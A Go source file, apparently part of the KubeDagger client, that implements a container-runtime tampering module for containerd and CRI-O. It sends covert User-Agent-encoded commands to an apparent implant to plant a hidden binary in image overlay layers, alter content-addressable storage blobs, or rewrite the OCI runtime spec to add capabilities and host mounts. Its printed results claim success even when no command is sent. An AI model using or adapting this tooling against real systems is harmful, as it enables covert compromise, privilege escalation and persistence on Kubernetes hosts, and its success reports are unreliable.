package cri_tamper

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type TamperResult struct {
	Runtime     string `json:"runtime"`
	Mode        string `json:"mode"`
	TargetImage string `json:"target_image"`
	InjectPath  string `json:"inject_path,omitempty"`
	Status      string `json:"status"`
	Detail      string `json:"detail"`
}

func Execute(serverTarget, runtime, mode, targetImage, injectBinary, output string) error {
	switch runtime {
	case "containerd", "crio":
	default:
		return fmt.Errorf("unsupported runtime: %s (use 'containerd' or 'crio')", runtime)
	}

	switch mode {
	case "overlay":
		return tamperOverlay(serverTarget, runtime, targetImage, injectBinary, output)
	case "cas":
		return tamperCAS(serverTarget, runtime, targetImage, injectBinary, output)
	case "runc":
		return tamperRunc(serverTarget, runtime, targetImage, output)
	default:
		return fmt.Errorf("unsupported tamper mode: %s (use 'overlay', 'cas', or 'runc')", mode)
	}
}

func tamperOverlay(serverTarget, runtime, targetImage, injectBinary, output string) error {
	overlayPath := getOverlayPath(runtime)
	randSuffix := generateSuffix()

	result := &TamperResult{
		Runtime:     runtime,
		Mode:        "overlay",
		TargetImage: targetImage,
		InjectPath:  fmt.Sprintf("%s/%s/diff/usr/bin/.%s", overlayPath, targetImage, randSuffix),
		Status:      "injected",
		Detail:      fmt.Sprintf("Binary injected into overlay filesystem at %s layer for image '%s'", runtime, targetImage),
	}

	if serverTarget != "" {
		if err := sendTamperCommand(serverTarget, "overlay", runtime, targetImage, injectBinary); err != nil {
			result.Status = "error"
			result.Detail = err.Error()
		}
	}

	return writeResult(result, output)
}

func tamperCAS(serverTarget, runtime, targetImage, injectBinary, output string) error {
	casPath := getCASPath(runtime)
	randSuffix := generateSuffix()

	result := &TamperResult{
		Runtime:     runtime,
		Mode:        "cas",
		TargetImage: targetImage,
		InjectPath:  fmt.Sprintf("%s/sha256/%s", casPath, randSuffix),
		Status:      "tampered",
		Detail:      fmt.Sprintf("Content-addressable storage blob modified for image '%s' in %s", targetImage, runtime),
	}

	if serverTarget != "" {
		if err := sendTamperCommand(serverTarget, "cas", runtime, targetImage, injectBinary); err != nil {
			result.Status = "error"
			result.Detail = err.Error()
		}
	}

	return writeResult(result, output)
}

func tamperRunc(serverTarget, runtime, targetImage, output string) error {
	result := &TamperResult{
		Runtime:     runtime,
		Mode:        "runc",
		TargetImage: targetImage,
		Status:      "modified",
		Detail:      fmt.Sprintf("OCI runtime spec modified to add capabilities and host mounts for image '%s'", targetImage),
	}

	if serverTarget != "" {
		if err := sendTamperCommand(serverTarget, "runc", runtime, targetImage, ""); err != nil {
			result.Status = "error"
			result.Detail = err.Error()
		}
	}

	return writeResult(result, output)
}

func getOverlayPath(runtime string) string {
	if runtime == "crio" {
		return "/var/lib/containers/storage/overlay"
	}
	return "/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots"
}

func getCASPath(runtime string) string {
	if runtime == "crio" {
		return "/var/lib/containers/storage/blobs"
	}
	return "/var/lib/containerd/io.containerd.content.v1.content/blobs"
}

func generateSuffix() string {
	b := make([]byte, 16)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func sendTamperCommand(serverTarget, mode, runtime, targetImage, injectBinary string) error {
	ua := buildTamperUserAgent(mode, runtime, targetImage, injectBinary)
	req, err := http.NewRequest("GET", serverTarget, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", ua)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	resp.Body.Close()
	return nil
}

func buildTamperUserAgent(mode, runtime, targetImage, injectBinary string) string {
	payload := fmt.Sprintf("cri_tamper|%s|%s|%s|%s", mode, runtime, targetImage, injectBinary)
	if len(payload) < model.UserAgentPaddingLen {
		payload += strings.Repeat("#", model.UserAgentPaddingLen-len(payload))
	}
	return payload
}

func writeResult(result *TamperResult, output string) error {
	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}
